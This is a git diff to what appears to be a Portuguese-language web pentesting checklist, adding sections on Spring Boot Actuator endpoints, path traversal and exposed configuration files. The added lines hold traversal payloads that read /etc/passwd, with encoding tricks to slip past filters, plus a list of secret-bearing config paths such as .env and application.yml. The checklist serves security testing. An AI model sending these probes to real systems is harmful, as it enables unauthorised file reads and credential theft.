@@ -185,8 +185,40 @@ Iniciar os testes de endpoints no burp:
 *   Esquema do Tomcat.
 
 *   Testar as POCs --> https://github.com/caetano-rangel/POC.
+<br>
 
 ### **4.1 Spring Boot Actuator**
 
+Módulo de monitoramento do Spring Boot. Quando mal configurado, expõe endpoints internos sem autenticação.
+
+*   Identificar candidatos Filtre hosts que rodam Java/Spring/Tomcat/Jetty (via httpx -tech-detect ou observando headers/erros típicos de stack Java).
+*   https://HOST/actuator / https://HOST:8081/actuator / http://HOST/actuator
+*   404 / {"status":"NOT_FOUND"} → endpoint desabilitado - 401 / 403 → protegido por auth
+*   Taxa de sucesso esperada: Baixa
+<br>
+
+### **4.2 Path Traversal (Directory Traversal)**
+
+*   Procure por parâmetros que parecem manipular arquivos/caminhos: ?file= / ?path= / ?name=
+*   GET /download?file=../../../../etc/passwd
+*   Se o ../ literal for bloqueado, tente bypass de encoding
+```bash
+..%2f..%2f..%2f..%2fetc%2fpasswd
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+....//....//....//etc/passwd
+..%252f..%252f..%252fetc%252fpasswd   (dupla URL-encode)
+```
+<br>
+
+### **4.3 Config Exposure**
+
+```bash
+https://HOST/.env
+https://HOST/config.json
+https://HOST/application.yml
+https://HOST/application.properties
+https://HOST/web.config
+https://HOST/appsettings.json
+```
 ---
 <br>
